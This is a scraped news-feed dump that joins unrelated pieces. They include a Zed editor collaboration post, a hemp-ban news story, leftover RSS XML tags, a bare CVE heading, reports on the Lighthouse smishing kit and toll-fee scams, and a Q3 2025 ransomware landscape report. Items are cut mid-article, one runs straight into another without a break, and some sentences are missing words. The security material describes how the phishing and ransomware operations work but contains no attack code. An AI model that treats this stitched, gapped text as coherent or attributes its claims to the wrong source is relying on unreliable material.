Concurrent edits don't merge cleanly, performance degrades quickly as more collaborators join, and worst of all, you often resort to sharing your screen over a Slack or Zoom anyway.We engineered Zed from the ground up to be collaborative—it is  a bolt-on service  an afterthought.Leveraging CRDTs as our core data structure, we ensure conflict-free and eventually consistent properties where everyone's changes merge seamlessly and converge to the same state.
You shouldn't have to worry about performing cursor gymnastics in order to avoid fatal flaws in the collaboration service.
Our architecture provides low latency, whether coworkers are in the same office or across an ocean, and performance remains snappy whether you're working in a pair or mob programming.Setup is effortless: no extensions to install, no per-session links to copy and paste; only your GitHub handle is required.
And with built-in audio and automatic switching to screensharing, there's no need to fall back to external tools when you need to communicate work happening outside the editor.We built Zed's collaboration service primarily for ourselves, so we can effectively build Zed, in Zed, together.
This isn't just a feature for us—it's  for how we work.
We've both benefited and find great joy in using Zed's collaboration service, and we think you will too!: The collaboration panel is opened by clicking the people icon in the status bar, and becomes accessible after you have signed in through the GitHub authentication flow.: This area houses virtual rooms called "channels" that are organized in a hierarchical structure.: Create top-level channels by clicking the  button.
Create nested children channels by right clicking an existing channel and selecting the  option.: GitHub avatars show who is in which channel.
Click a channel's name to join it.: Click the document icon to access its "channel notes," which serves as metadata associated with the channel.: Once in a channel, mute/unmute your voice via the microphone icon.: Allow others the option to view your screen.: Channels are .
Projects are voluntarily shared  them via the  button in the title bar.
Channels can be public (🛜) or restricted to specific members (#️⃣), and include a permissions system with , , and  roles.: Click an avatar in the title bar to follow a teammate.
If you are following someone who is sharing their screen, Zed will automatically switch between following their cursor in your Zed instance and their screen share, depending on whether they are focused on Zed or another application.See our FAQs on data and privacy regarding collaboration.Our office is Zed's collaboration panel.Our channel tree has been through many iterations as our company has grown, but what we have today is a structure flexible enough to accommodate many forms of collaboration.
Our channel tree is used for:While any channel can technically be categorized and used as a "meeting" space, we have a few designated for "all-hands" meetings.
These channels are used for checking in, knowledge dissemination, and reflection.
Projects aren't typically shared through these meetings; the work happens directly in channel notes.
Some examples:Every Monday, we jump into the  channel to discuss our plans for the week, review metrics, and discuss any pressing matters we need to act on.The  channel is occupied every 6 weeks.
In this meeting, every staff member is encouraged to add bullet points under categories like  and what could have gone better?, and upvote which items we will discuss during this time slot to learn from.Meetings don't have to be a drag.
The  channel is used every Friday and is considered by the team to be a "banger."
Staff members hop in, volunteer to show off a cool feature or bug fix they worked on, and get real-time feedback from the rest of the team.In addition to channels for specific company-wide meetings, we have a handful of generalized meeting rooms for one-offs that don't fit elsewhere and don't demand a dedicated space.For a company building a text editor, it felt right to name these meeting spaces after legendary typing machines of the past.We structure channels and teams around specific projects, and it's where the bulk of our collaboration happens.
Projects typically group multiple features needed for larger initiatives, such as , , , and .
In these channels, a project member acts as host by sharing their Zed codebase instance for the team to collaborate on.
Channel notes will typically include a list of the members on the project, goals, links to GitHub Issues / Discussions / project boards that we are aiming to tackle in this effort, and the overall progress of the project.Subchannels are often used to organize meeting spaces for individual components of the project.Not all project-based channels focus on features we are adding to Zed; many exist to support non-development work like marketing, community, and metrics.Many of our project channels are public, you can join our channel tree, read the notes, and learn about how we build Zed, just like .In our tree, we have a  channel.
Staff members are encouraged to add a subchannel named after themselves here.
These are our personal workspaces—our "virtual cubicles."
When a teammate is in a personal channel, it tends to send the signal: "I need some heads-down focus time to get this task over the line, but you're welcome to drop by if you need something."
Everyone on the team utilizes these slightly differently. I frequently use my channel to organize content for blog posts I want to work on.: This blog post was initially outlined in my  subchannel.Astute observers might notice there are no avatars next to these channels in the above screenshot.
It isn't uncommon for these to be unoccupied because the team generally prefers to collaborate when possible!Our virtual office is not so different from any other in-person office—we have designated spaces for meetings, working on projects, and individual focus time.
We've structured our channel tree to support workflows that empower us to operate our company, but you can structure yours however best fits your team's needs.While collaboration in Zed has given us the ability to run Zed Industries from within Zed, it merely  the surface of how we envision working as a team.
We're building toward a future where collaboration is continuous conversation, not discrete commits—where every discussion, edit, and insight remains linked to the code as it evolves, accessible to both teammates and AI agents.Getting here hasn't been a straight line.
Over the years, we've paused work on collaboration to focus on features users frequently requested—agent-powered tooling, debugging, Windows support, and git support—but our primary goals for Zed .
As we reach parity with other editors on table-stakes features, these detours are becoming less frequent, opening us up to refocus on what we're most excited about: building the greatest multiplayer software development tool.Collaboration as it stands today is considered , and for the time being, is free for all to use!

But only if Congress agrees to something else first: banning intoxicating hemp nationwide.On Sunday, Senate leadership inserted a hemp-recriminalization clause into the must-pass funding bill that would end the longest shutdown in American history, reported Marijuana Moment. On Monday, Cannabis Business Times confirmed that intoxicating hemp is being targeted as part of the three-bill spending package tied to reopening the government.Not a standalone bill. Not a debate on cannabis reform. A shutdown ransom note.What the bill actually doesThe hemp language appears in the Agriculture–FDA spending bill, which is bundled into the shutdown deal. It would:Redefine hemp to include , not just delta-9 THCCount any cannabinoids with “similar effects” toward that THC totalProhibit synthesized cannabinoids or converted CBD intermediatesCap finished hemp products at 0.4 milligrams total THC per containerNot 0.4 mg per gummy. Per entire bottle, bag, vape, beverage.That wipes out full-spectrum tinctures, hemp seltzers, delta-8 anything and even most CBD oils.Jim Higdon, cofounder of Cornbread Hemp, told Marijuana Moment:“The .4mg limit will make 100% of Cornbread Hemp products illegal.”“This is a dark day for anyone who hopes for a future when cannabis is descheduled in America.”Senator Mitch McConnell pushed the 2018 Farm Bill that legalized hemp. Now he is pushing to shut down the intoxicating hemp market.Update — November 10, 2025: Back in 2018, when hemp legalization passed, McConnell publicly celebrated it. In remarks entered into the Congressional Record on April 12, 2018, he said: “Our bill will finally legalize hemp and remove it from the list of controlled substances.” On the same day, Senator Ron Wyden added, “Hemp does not produce the high associated with marijuana. The only thing you are going to accomplish by smoking hemp is wasting your breath, wasting your time, and wasting lighter fluid.” Those statements directly contrast with McConnell’s 2025 argument that intoxicating hemp products were never the intent of the Farm Bill.“My 2018 hemp bill sought to create an agricultural hemp industry, not open the door to the sale of unregulated, intoxicating, lab-made, hemp-derived substances with no safety framework.”Thomas Winstanley, EVP and general manager of Edibles.com, responded in a statement sent to :“Senator Mitch McConnell, architect of the 2018 Farm Bill, sowed the hemp seeds, and now seeks to scorch the soil, salting the fields of his own harvest.”He called banning legal hemp a move that would only push consumers into unregulated channels, writing:“Banning legitimate hemp products won’t stop bad actors, it will only drive the market underground and further erode consumer safety.”Rand Paul says the Senate will have to fight him for itThe other senator from Kentucky is not on board.According to Politico, Rand Paul warned GOP leadership he would slow down the shutdown deal if hemp was targeted.“I’ll vote no, but it’ll take them five days to pass this,” Paul said.He also accused his own party of trying to “kill an entire industry.”This is not theater. Paul has done it before: Cannabis Business Times notes that he previously forced Senate leaders to remove similar hemp-ban language in July by threatening to stall the funding package.Two Kentucky senators. Both instrumental to U.S. hemp. Now they are fighting over who kills or saves it.“The U.S. Hemp Roundtable condemns the latest proposed Senate language to recriminalize hemp products, a harmful decision by Congress that threatens to eliminate America’s $28.4 billion hemp industry and jeopardizes more than 300,000 American jobs.”“If passed, this legislation would wipe out 95 percent of the industry, shuttering small businesses and American farms while costing states $1.5 billion in lost tax revenue.”“Our industry is being used as a pawn as leaders work to reopen the government.”According to Lynnwood Times, intoxicating hemp represents  of current industry revenue.“Every state program that has codified Hemp products will shutter. Hemp farmers will go out of business. 330,000 Americans will lose their jobs. There is no ‘state legal’ hemp.”Not everyone wants hemp savedParts of the regulated cannabis industry are cheering.Chris Lindsey, director of state advocacy and public policy at ATACH, said:“We applaud lawmakers for taking this critical step to clarify Congress’ intent in the 2018 Farm Bill. Willful misinterpretation of the Farm Bill led to the proliferation of unregulated synthetic THC products widely available for sale to minors.”He argues that the bill creates clear lanes separating natural hemp, synthetic cannabinoids and cannabis sold in legal dispensaries.Meanwhile, as  recently reported in Big Alcohol’s Hemp Civil War, the alcohol industry is split. Producer lobbies want intoxicating hemp removed until federal rules exist, while beer and spirits distributors want to keep hemp beverages legal and taxed like alcohol.Because distributors are already moving hemp drinks.To them, hemp THC is not a threat. It is inventory.Veterans get cut out entirelyAnother buried twist: The shutdown deal removed previously approved language that would have let VA doctors recommend medical cannabis to patients.The message to veterans is simple: Not now.The deal would reopen the government until January 30, 2026.The hemp ban has a  before enforcement.Rand Paul can force multi-day delays if leadership refuses to remove or modify the language.If passed, brands have three options:Reformulate to fit the Enter the regulated cannabis systemCongress says it is closing a loophole. The hemp industry says Congress is closing an industry.]]></content:encoded></item><item><title>Tesla Is Recalling Cybertrucks Again</title><link>https://www.popularmechanics.com/cars/hybrid-electric/a69384091/cybertruck-lightbar-recall/</link><author>2OEH8eoCRo0</author><category>dev</category><pubDate>Thu, 13 Nov 2025 15:38:04 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SIMA 2: An agent that plays, reasons, and learns with you in virtual 3D worlds</title><link>https://deepmind.google/blog/sima-2-an-agent-that-plays-reasons-and-learns-with-you-in-virtual-3d-worlds/</link><author>meetpateltech</author><category>dev</category><pubDate>Thu, 13 Nov 2025 15:29:38 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[This research was developed by the SIMA 2 team: Maria Abi Raad, John Agapiou, Frederic Besse, Andrew Bolt, Sarah Chakera, Harris Chan, Jeff Clune, Alexandra Cordell, Martin Engelcke, Ryan Faulkner, Maxime Gazeau, Arne Olav Hallingstad, Tim Harley, Ed Hirst, Drew Hudson, Laura Kampis, Sheleem Kashem, Thomas Keck, Matija Kecman, Oscar Knagg, Alexander Lerchner, Bonnie Li, Yulan Liu, Cong Lu, Maria Loks-Thompson, Joseph Marino, Kay McKinney, Piermaria Mendolicchio, Anna Mitenkova, Alexandre Moufarek, Fabio Pardo, Ollie Purkiss, David Reichert, John Reid, Tyson Roberts, Daniel P.

For the Prosopo team, MongoDB Atlas was initially a fast, reliable way to run a cloud database, but as our data grew, so did the bills. Over the last year, we realised that we were spending  per month on infrastructure that we could run more efficiently ourselves. We explored various options but ultimately decided to migrate our MongoDB deployment to Hetzner, a cost-effective cloud provider.Here's how we managed to cut our costs by 90% without sacrificing performance or reliability.When we first started building, MongoDB Atlas was an easy choice. Everything was set up for us, and we could focus on building our application without worrying about database management. The free tier was sufficient for our initial needs, and as we grew, scaling up was as simple as a few clicks. However, scaling came with a steep price tag. We went from paying $0 per month for a small database to over $3,000 per month for a few hundred GBs of data. The cost breakdown before we migrated looked roughly like this:Atlas Continuous Cloud Backup StorageAtlas AWS Data Transfer (Same Region)Atlas AWS Data Transfer (Different Region)Atlas AWS Data Transfer (Internet)The more keen eyed among you will have noticed the huge cost associated with data transfer over the internet - its as much as the servers! We're building Prosopo to be resilient to outages, such as the recent massive AWS outage, so we use many different cloud providers. This means that a lot of our database traffic goes over the internet, which is very expensive on MongoDB Atlas, due to it running on AWS (other options are available, but we chose AWS).When your entire stack is on AWS, data transfer costs are minimal, as shown by the "Same Region" line item above. However, this architecture creates centralisation and single points of failure, which we want to avoid.Oh, and even though we were paying this much, we didn't have access to any support! That's a separate paid plan.Hetzner offered a compelling alternative:High-performance dedicated servers at a fraction of AWS pricingPredictable, flat-rate pricing without surprise billsStrong European data center presence, which aligns with our privacy requirements between our application servers and databaseWe decided that the only way to regain control over our costs was to move to a self-hosted solution. MongoDB Atlas was running in replica set mode but we opted to instead set up a much beefier machine with a huge amount of RAM (256GB) and fast SSDs to handle our workload. In future, if we want to move back to a distributed setup, we can always add more nodes.The server in question costs $160 per month, which is a huge saving over our previous costs.Our Atlas instance held about 500GB of data but the product doesn't rely on this data in real-time - its used for generating detection rules using ML modelling, and the rules are applied to our CAPTCHA providers in a follow-up step. The reason for this architecture stems from our blockchain beginnings.We were able to take a mongodump of the database, restore it to the new Hetzner server, and then use scripts to sync any changes that happened during the migration window.Setting up our Hetzner server wasn't just a matter of spinning up MongoDB. We run Proxmox on the host machine, created an Ubuntu VM, and deployed MongoDB in Docker. Networking added another layer of complexity: the VM sits on a private subnet (10.0.0.x) with the host handling DHCP, NAT, and port forwarding. We also use Traefik as a reverse proxy to handle SSL and route traffic from the outside world to MongoDB, which saves us from wrestling with MongoDB's own SSL certificates. While this setup gives us flexibility and security, it does require a bit more technical know-how compared to fully managed solutions.When you migrate from MongoAtlas to a self-hosted solution, you're taking on more responsibility for managing your database. You need to make sure it is secure, backed up, monitored, and can be recreated in case of failure or the need for extra servers arises. We used the following tools:The monitoring in MongoDB Atlas was very useful. It highlighted times when we were opening up unlimited connections due to connection leaks in our application code. However, MongoDB Atlas wouldn't let us kill the connections using admin shell commands! This meant we reached our connection limit and we had no way to restart the server. We had to kill our services to free up connections. With our own server, we can now monitor and manage connections directly via OpenObserve and, crucially, the MongoDB shell.Backups in MongoDB Atlas were also convenient but expensive. We now use , a cron, and a storage box from Hetzner to take daily backups of our database. The backups are compressed and encrypted before being sent to the remote storage box.We've opted for a DIY approach to our servers and databases, which has significantly reduced our costs whilst giving us more control over our infrastructure. However, this approach isn't for everyone. We're still a small team, and managing the limited number of servers we run is feasible.The performance we're seeing from our new standalone MongoDB server is very much improved over the Atlas setup. This is simply because the specs are so much higher and the indexes can mostly be held in memory. We are aware that MongoDB Atlas has something called vector search but we weren't using it, so it wasn't a factor in our decision.For reference, the specs look like this:8 cores Intel Xeon W-21454 x 3.84 TB NVMe SSD RAID 5Its more than likely that as we grow, we'll start to see value in hosted solutions again, but for now we're quite pleased with the new setup. Hopefully this experience helps to inform others starting out on their cloud journey - for a small amount of pain you can save a lot of money!]]></content:encoded></item><item><title>CVE-2025-64741 - Zoom Workplace for Android - Improper Authorization Handling</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64741</link><author></author><category>vulns</category><pubDate>Thu, 13 Nov 2025 15:15:54 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64741

Google said Lighthouse has harmed more than a million victims across 120 countries.A component of the Chinese phishing kit Lighthouse made to target customers of The Toll Roads, which refers to several state routes through Orange County, Calif.Regardless of the text message lure used or brand used, the basic scam remains the same: After the visitor enters their payment information, the phishing site will automatically attempt to enroll the card as a mobile wallet from Apple or Google. The phishing site then tells the visitor that their bank is going to verify the transaction by sending a one-time code that needs to be entered into the payment page before the transaction can be completed.If the recipient provides that one-time code, the scammers can link the victim’s card data to a mobile wallet on a device that they control. Researchers say the fraudsters usually load several stolen wallets onto each mobile device, and wait 7-10 days after that enrollment before selling the phones or using them for fraud.Google called the scale of the Lighthouse phishing attacks “staggering.” A May 2025 report from  found the domains used by the Smishing Triad are rotated frequently, with approximately 25,000 phishing domains active during any 8-day period.Google’s lawsuit alleges the purveyors of Lighthouse violated the company’s trademarks by including Google’s logos on countless phishing websites. The complaint says Lighthouse offers over 600 templates for phishing websites of more than 400 entities, and that Google’s logos were featured on at least a quarter of those templates.Google is also pursuing Lighthouse under the Racketeer Influenced and Corrupt Organizations (RICO) Act, saying the Lighthouse phishing enterprise encompasses several connected threat actor groups that work together to design and implement complex criminal schemes targeting the general public.According to Google, those threat actor teams include a “” that supplies the phishing software and templates; a “” that provides a list of targets; a “” that provides the tools to send fraudulent text messages in volume; a “,” in charge of monetizing the phished information; and an “,” which runs their Telegram support channels and discussion groups designed to facilitate collaboration and recruit new members.“While different members of the Enterprise may play different roles in the Schemes, they all collaborate to execute phishing attacks that rely on the Lighthouse software,” Google’s complaint alleges. “None of the Enterprise’s Schemes can generate revenue without collaboration and cooperation among the members of the Enterprise. All of the threat actor groups are connected to one another through historical and current business ties, including through their use of Lighthouse and the online community supporting its use, which exists on both YouTube and Telegram channels.”Silent Push’s May report observed that the Smishing Triad boasts it has “300+ front desk staff worldwide” involved in Lighthouse, staff that is mainly used to support various aspects of the group’s fraud and cash-out schemes.An image shared by an SMS phishing group shows a panel of mobile phones responsible for mass-sending phishing messages. These panels require a live operator because the one-time codes being shared by phishing victims must be used quickly as they generally expire within a few minutes.Google alleges that in addition to blasting out text messages spoofing known brands, Lighthouse makes it easy for customers to mass-create fake e-commerce websites that are advertised using Google Ads accounts (and paid for with stolen credit cards). These phony merchants collect payment card information at checkout, and then prompt the customer to expect and share a one-time code sent from their financial institution.Once again, that one-time code is being sent by the bank because the fake e-commerce site has just attempted to enroll the victim’s payment card data in a mobile wallet. By the time a victim understands they will likely never receive the item they just purchased from the fake e-commerce shop, the scammers have already run through hundreds of dollars in fraudulent charges, often at high-end electronics stores or jewelers. works in security research at SecAlliance, a CSIS Security Group company, and he’s been tracking Chinese SMS phishing groups for several years. Merrill said many Lighthouse customers are now using the phishing kit to erect fake e-commerce websites that are advertised on Google and Meta platforms.“You find this shop by searching for a particular product online or whatever, and you think you’re getting a good deal,” Merrill said. “But of course you never receive the product, and they will phish that one-time code at checkout.”Merrill said some of the phishing templates include payment buttons for services like , and that victims who choose to pay through PayPal can also see their PayPal accounts hijacked.A fake e-commerce site from the Smishing Triad spoofing PayPal on a mobile device.“The main advantage of the fake e-commerce site is that it doesn’t require them to send out message lures,” Merrill said, noting that the fake vendor sites have more staying power than traditional phishing sites because it takes far longer for them to be flagged for fraud.Merrill said Google’s legal action may temporarily disrupt the Lighthouse operators, and could make it easier for U.S. federal authorities to bring criminal charges against the group. But he said the Chinese mobile phishing market is so lucrative right now that it’s difficult to imagine a popular phishing service voluntarily turning out the lights.Merrill said Google’s lawsuit also can help lay the groundwork for future disruptive actions against Lighthouse and other phishing-as-a-service entities that are operating almost entirely on Chinese networks. According to Silent Push, a majority of the phishing sites created with these kits are sitting at two Chinese hosting companies:  (AS132203) and  (AS45102).“Once Google has a default judgment against the Lighthouse guys in court, theoretically they could use that to go to Alibaba and Tencent and say, ‘These guys have been found guilty, here are their domains and IP addresses, we want you to shut these down or we’ll include you in the case.'”If Google can bring that kind of legal pressure consistently over time, Merrill said, they might succeed in increasing costs for the phishers and more frequently disrupting their operations.“If you take all of these Chinese phishing kit developers, I have to believe it’s tens of thousands of Chinese-speaking people involved,” he said. “The Lighthouse guys will probably burn down their Telegram channels and disappear for a while. They might call it something else or redevelop their service entirely. But I don’t believe for a minute they’re going to close up shop and leave forever.”]]></content:encoded></item><item><title>1 million victims, 17,500 fake sites: Google takes on toll-fee scammers</title><link>https://www.malwarebytes.com/blog/news/2025/11/1-million-victims-17500-fake-sites-google-takes-on-toll-fee-scammers</link><author></author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:43:06 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[A Phishing-as-a-Service (PhaaS) platform based in China, known as “Lighthouse,” is the subject of a new Google lawsuit.Lighthouse enables smishing (SMS phishing) campaigns, and if you’re in the US there is a good chance you’ve seen their texts about a small amount you supposedly owe in toll fees. Here’s an example of a toll-fee scam text:Google’s lawsuit brings claims against the Lighthouse platform under federal racketeering and fraud statutes, including the Racketeer Influenced and Corrupt Organizations Act (RICO), the Lanham Act, and the Computer Fraud and Abuse Act.The texts lure targets to websites that impersonate toll authorities or other trusted organizations. The goal is to steal personal information and credit card numbers for use in further financial fraud.As we reported in October 2025, Project Red Hook launched to combine the power of the US Homeland Security Investigations (HSI), law enforcement partners, and businesses to raise awareness of how Chinese organized crime groups use gift cards to launder money.These toll, postage, and refund scams might look different on the surface, but they all feed the same machine, each one crafted to look like an urgent government or service message demanding a small fee. Together, they form an industrialized text-scam ecosystem that’s earned Chinese crime groups more than $1 billion in just three years.Google says Lighthouse alone affected more than 1 million victims across 120 countries. A September report by Netcraft discussed two phishing campaigns believed to be associated with Lighthouse and “Lucid,” a very similar PhaaS platform. Since identifying these campaigns, Netcraft has detected more than 17,500 phishing domains targeting 316 brands from 74 countries.As grounds for the lawsuit, Google says it found at least 107 phishing website templates that feature its own branding to boost credibility. But a lawsuit can only go so far, and Google says robust public policy is needed to address the broader threat of scams:“We are collaborating with policymakers and are today announcing our endorsement of key bipartisan bills in the U.S. Congress.”Will lawsuits, disruptions, and even bills make toll-fee scams go away? Not very likely. The only thing that will really help is if their source of income dries up because people stop falling for smishing. Education is the biggest lever. Red flags in smishing messagesThere are some tell-tale signs in these scams to look for:Spelling and grammar mistakes: the scammers seem to have problems with formatting dates. For example “September 10nd”, “9st” (instead of 9th or 1st).you only have one or two days to pay. Or else…The over-the-top threats: Real agencies won’t say your “credit score will be affected” for an unpaid traffic violation. “Ohio Administrative Code 15C-16.003” doesn’t match any real Ohio BMV administrative codes. When a code looks fake, it probably is! Truly trusted organizations don’t send urgent “pay now or else” links by text.Vague or missing personalization: Genuine government agencies tend to use your legal name, not a generic scare message sent to many people at the same time.Recognizing scams is the most important part of protecting yourself, so always consider these golden rules:Always search phone numbers and email addresses to look for associations with known scams.When in doubt, go directly to the website of the organization that contacted you to see if there are any messages for you.Do not get rushed into decisions without thinking them through.Do not click on links in unsolicited text messages.Do not reply, even if the text message explicitly tells you to do so.If you have engaged with the scammers’ website:Immediately change your passwords for any accounts that may have been compromised. Contact your bank or financial institution to report the incident and take any necessary steps to protect your accounts, such as freezing them or monitoring for suspicious activity. Consider a fraud alert or credit freeze. To start layering protection, you might want to place a fraud alert or credit freeze on your credit file with all three of the primary credit bureaus. This makes it harder for fraudsters to open new accounts in your name.US citizens can report confirmed cases of identity theft to the FTC at identitytheft.gov.

During the third quarter of 2025, we monitored more than **85 active data leak sites** (DLS) that collectively listed **1,592 new victims**. Compared to the **1,607 victims reported in Q2** 2025, the publication rate remained stable though it is still **notably higher** than the 1,270 victims recorded in Q3 2024 (a 25% increase YoY). Overall, there are **approximately 520 to 540 new victims per month**, indicating that ransomware activity has plateaued albeit at historically high levels.

_Figure 1 – Total Number of Reported Ransomware Victims in DLS, per month._

Despite the termination of several prominent ransomware groups, the **overall number of active threat actors continues to grow**, with new ones appearing every month.

During Q3 2025, we observed a steady expansion of double-extortion activity, driven mostly by small and emerging operators. Of the 85 data leak sites tracked this quarter, **47 groups published fewer than ten victims**, suggesting a growing number of affiliates moving beyond established ransomware-as-a-service (RaaS) programs to conduct attacks independently.

This fragmentation follows the **closure or dormancy** of several major RaaS brands during the year, including RansomHub, 8Base, BianLian, Cactus, and others. In Q3 alone, 14 new groups began publishing victims, bringing the total number of **newly observed actors in 2025 to 45**. In Q1, the ten most active groups accounted for 71% of all DLS postings. In Q2, their share fell to 63%, and by Q3, to just 56%.

These findings illustrate the **limited long-term impact of law-enforcement operations** on the overall number of ransomware victims. Despite several high-profile takedowns during the past year—most of them directed at **large RaaS operations** such as **LockBit, 8Base, and Blacksuit**—the total volume of attacks did **not significantly decline**. Instead, the attacks continue a **gradual upward trend**, from an average of **approximately 420 victims per month in Q2–Q3 2024** to about **535 per month in the same period of 2025**.

This limited effect appears to stem from the **focus of enforcement efforts**: takedown operations primarily target **RaaS infrastructure and administrators**, which does not affect the **affiliate operators** who conduct the intrusions and drive the operational execution. When a major RaaS platform is disrupted, these affiliates typically **migrate to alternative programs or establish their own data-leak sites**, resulting in only short-term interruptions to overall activity levels.

The effects of **affiliate mobility** are evident both in the **proliferation of new leak sites** and in the **rising activity** of existing groups. **Qilin**, the most active actor in Q3 2025—and one of the most aggressive in recruiting former **RansomHub** affiliates—averaged around **75 victims per month**, up from **36 in Q1** prior to RansomHub’s closure in April. **INC Ransomware** increased its monthly total from **23 to 39** victims, and **Play** went from **28 to 33** during the same period.

This **ongoing fragmentation of the ecosystem** may further erode ransomware operators’ reliability. Victims traditionally rely on attackers reputation to supply decryption keys after payment. Large RaaS brands have a commercial incentive to maintain credibility and provide the keys, but smaller, short-lived groups do not, leading to reduced payment rates which are currently estimated at **25–40% of total attacks**.

In this context, the re-centralization of affiliates around major, recognizable brands remains strategically significant. Large RaaS programs preserve their market advantage through **stability, reputation, and structured affiliate infrastructure**. The **re-emergence of LockBit**, discussed in the following section, may represent precisely such a re-consolidation of affiliates under a **stable and trusted brand identity**.

_Figure 2 – Ransomware Groups by Publicly Claimed Victims – Q3 2025._

Qilin, Akira, INC Ransom, Play, and Safepay maintained their positions among the most active groups in Q3. Warlock and The Gentlemen emerged more recently, both demonstrating rapid early activity: Warlock began posting victims in June 2025 and reached 43 total listings in Q3, while The Gentlemen claimed 38 victims during a single month of operation in September 2025.

Until its disruption during Operation Cronos in early 2024, LockBit dominated the RaaS ecosystem, accounting for 20–30% of all published victims. Following the takedown, several arrests were announced, and successor groups — first RansomHub, then Qilin — attempted to inherit its affiliate base. However, the group’s core administrator, known as LockBitSupp, was never apprehended and in underground forums continued to hint at an eventual comeback.

The release of LockBit 5.0 in September 2025 marks the group’s return to active operations, reigniting questions about whether the RaaS landscape may again consolidate around this long-standing brand.

_Figure 3 – LockBit’s share of all DLS-published victims._

LockBit had long promised a comeback. In May 2025, following the latest in a series of public setbacks, the group’s administrator, LockBitSupp, responded on the RAMP underground forum, declaring that they would _“always rise up after being hacked.”_

_Figure 4 – LockBit administrator vowing to return on the RAMP forum._

_Figure 5 – LockBit administrator announcing the group’s return on RAMP chat._

The XSS Russian-language cybercriminal forum previously banned LockBitSupp following a dispute with another user and reaffirmed that “explicit advertising of RaaS will remain prohibited.” RaaS programs depend on affiliate recruitment for their business model and maintaining visibility on prominent criminal forums such as XSS or RAMP is essential to their work.

By early September, the XSS administrator reported that LockBitSupp requested to be reinstated and opened the decision to a community vote.

_Figure 6 – XSS forum administrator polling members on whether to reinstate LockBitSupp._

Despite this effort, the vote ultimately failed, and LockBit remains banned from XSS.

_Figure 7 – Voting results on LockBitSupp’s proposed return to XSS._

In early September 2025, LockBit announced on RAMP the official launch of LockBit 5.0, coinciding with the sixth anniversary of the operation. New affiliates were asked to provide a Bitcoin deposit of roughly US $500 for access to a new encryptor and an updated control panel.

_Figure_ _8_ _– LockBit 5.0 affiliate registration screen._

Since that announcement, we identified more than 15 distinct victims affected by LockBit 5.0, which replaced the earlier 4.0 builds that were still active until April 2025. LockBit continues to enforce strict operational security: all affiliate interfaces require individualized credentials, and no victims have been publicly listed on the group’s data-leak site.

_Figure_ _9_ _– LockBit 5.0 ransom note from an attack in mid-September 2025_

Updated ransom notes now explicitly identify themselves as “LockBit 5.0” and include a unique personal identifier that allows each victim to access a private negotiation portal. Victims are typically granted a 30-day grace period before the stolen data is published.

_Figure_ _10_ _– Screenshot of LockBit 5.0 negotiations with a victim, mid-September 2025._

Analysis of the initial campaign shows that approximately 65 percent of identified attacks targeted organizations in the United States, with the remainder affecting Mexico, Indonesia, and several European countries.

LockBit 5.0 represents an upgraded evolution of the previous 4.0 version, incorporating Windows, Linux, and ESXi variants. The new build introduces enhanced evasion and anti-analysis mechanisms, faster encryption routines, and the use of a randomized 16-character file extension to disrupt signature-based detection. Most confirmed infections were deployed on Windows systems, while roughly 20 percent targeted ESXi virtual infrastructure.

Historically, LockBit has been among the most active and disruptive RaaS programs. With its extensive experience and the lower entry barrier for new affiliates, the re-emergence of the group poses a renewed risk to organizations across many sectors. The actions observed in September likely represent only the leading edge of a larger campaign, and the October victim postings on LockBit’s data-leak site are expected to confirm its full operational return.

DragonForce distinguishes itself among emerging ransomware groups through its heavy emphasis on public relations and coalition branding, frequently issuing high-profile statements and partnership claims on criminal forums. In September 2025, it announced on RAMP a supposed “coalition” with Qilin and LockBit, presented as a unified affiliate initiative.

However, these declarations appear largely symbolic, with no verified evidence of shared infrastructure or joint operations. The announcements likely serve to attract affiliates and project influence within a fragmented RaaS market. This reflects DragonForce’s broader strategy to maintain visibility and credibility in an increasingly competitive underground ecosystem.

_Figure_ _11_ _– DragonForce announcing updates and coalition with LockBit and Qilin._

DragonForce roughly tripled its monthly victim count since the shutdown of RansomHub and claimed 56 victims in Q3 2025. This is still fewer than Qilin and Akira but shows steady growth. DragonForce continues to actively recruit affiliates and promote new features in its RaaS program and recently announced on RAMP a data-driven extortion service that offers affiliates tailored analysis of stolen data to maximize ransom leverage.

_Figure_ _12_ _– DragonForce’s “data audit” services._

Under this model, an affiliate that accessed a large dataset (typically over 300 GB) from a company with annual revenues above US $15 million can submit it for analysis and maximize the extortion impact. In a recent showcased example, DragonForce reviewed stolen files from a gold mining company and highlighted the most valuable commercial and financial information, accompanied by a customized extortion letter.

_Figure_ _13_ _– DragonForce Audit example._

Qilin remains the most active ransomware group in 2025, increasing its monthly victim rate to an average of 75 victims in Q3, up from 36 in Q1.

Although the group presents itself as ideologically motivated, its operations appear entirely financially driven. In a June 2024 interview published on its WikiLeaksV2 blog, Qilin’s operators described themselves as “idealists who love our country.” This statement, however, contrasts sharply with the group’s broad and opportunistic targeting across sectors and geographies.

_Figure_ _14_ _– Qilin interview from June 2024 on their official blog._

In a separate interview on SuspectFile, a Qilin affiliate characterized the program as profit-focused and flexible, with affiliates responsible for intrusion and exfiltration while Qilin manages infrastructure, leak-site operations, and negotiations. Reported affiliate share ranges between 80% and 85%, which is among the highest in the market. This has attracted numerous operators previously active under RansomHub and BianLian.

Qilin’s open affiliate framework accommodates actors with diverse motivations and capabilities. In one recent case, the group’s data-leak site briefly listed Israel’s Shamir Medical Center among its victims.

_Figure_ _15_ _– Shamir Medical Center announcement on Qilin’s DLS._

According to Israeli researcher Erez Dassa, the responsible affiliate was likely an Iranian-linked threat actor. Dassa reported that following direct communication, Qilin’s administrators agreed that public association with terrorism or politically motivated activity could expose the group to additional pressure and subsequently removed the listing.

_Figure 16- Erez Dassa’s Telegram post explaining the Shamir incident._

